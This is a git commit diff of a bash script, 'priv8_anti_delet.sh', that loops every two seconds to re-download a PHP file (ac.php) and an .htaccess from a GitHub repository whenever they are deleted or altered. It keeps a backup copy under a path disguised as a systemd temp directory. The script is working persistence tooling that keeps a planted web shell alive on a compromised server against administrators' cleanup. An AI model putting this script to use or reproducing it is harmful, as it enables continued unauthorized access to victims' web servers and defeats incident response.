e6c70d93a7482e965b2279fa97356c70836350c6
T10 <113588203+t101804@users.noreply.github.com>
2023-04-09 06:04:56 +0700

    Update priv8_anti_delet.sh

--- priv8_anti_delet.sh
+++ priv8_anti_delet.sh
@@ -1,28 +1,55 @@
 #!/bin/bash
-# Dont delete author name :)
-# Telegram : @CallMeRep
-# Sorry if my comment explaination is bad english bcs is write by me not by chatgpt
+
+HTACCESS_FILE=".htaccess"
+AC_FILE="ac.php"
+HTACCESS_BACKUP="/var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a"
+
+# Define function to download files
+function download_files {
+    # Check if ac.php exists and contains @CallMeRep, else download and set proper permissions
+    if [ ! -f $AC_FILE ] || ([ -f $AC_FILE ] && ! grep -q '@CallMeRep' $AC_FILE); then
+        # if not exist or doesn't contain @CallMeRep, get ac.php from repo
+        if [ -f $AC_FILE ]; then
+            chmod 0644 $AC_FILE
+        fi
+
+        # Download ac.php, check for permission errors
+        if curl --fail --silent https://raw.githubusercontent.com/t101804/repshare/main/ac.php -o $AC_FILE; then
+            echo "Successfully downloaded $AC_FILE"
+        else
+            echo "Permission denied while downloading $AC_FILE"
+        fi
+    fi
+
+    # Check if .htaccess exists and has proper permissions, else download and set proper permissions
+    if [ ! -f $HTACCESS_FILE ] || ([ -f $HTACCESS_FILE ] && [ ! -r $HTACCESS_FILE ] && [ ! -w $HTACCESS_FILE ]) || ! cmp --silent $HTACCESS_FILE $HTACCESS_BACKUP; then
+        # if not same auto replace the htaccess
+        if [ -f $HTACCESS_FILE ]; then
+            chmod 0644 $HTACCESS_FILE
+        fi
+
+        # Download htaccess, check for permission errors
+        if curl --fail --silent https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o $HTACCESS_FILE; then
+            echo "Successfully downloaded $HTACCESS_FILE"
+        else
+            echo "Permission denied while downloading $HTACCESS_FILE"
+        fi
+    fi
+}
 
 # Download initial .htaccess and backup shell file
-curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a
+curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o $HTACCESS_BACKUP
 sleep 2
 
 # Loop to check for changes in files
 while true; do
     # Print the Time and Date Before Execution
     echo $(TZ=Asia/Jakarta date)
-    # Check if ac.php is exist or no
-    if [ ! -f ac.php ] || ([ -f ac.php ] && ! grep -q '@CallMeRep' ac.php); then
-        # if not exist or doesn't contain @CallMeRep, get ac.php from repo
-        curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php
-        chmod +x ac.php
-    fi
-    # check if .htaccess is readable and writeable and check if htaccess is same with we like import in the first code
-    if [ -r .htaccess ] && [ -w .htaccess ] && ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then
-        # if not same auto replace the htaccess
-        curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess
-    fi
-    #print the time and date end of execution
+
+    # Call download_files function to check for changes and download files
+    download_files
+
+    # Print the Time and Date After Execution
     echo $(TZ=Asia/Jakarta date)
     sleep 2
 done
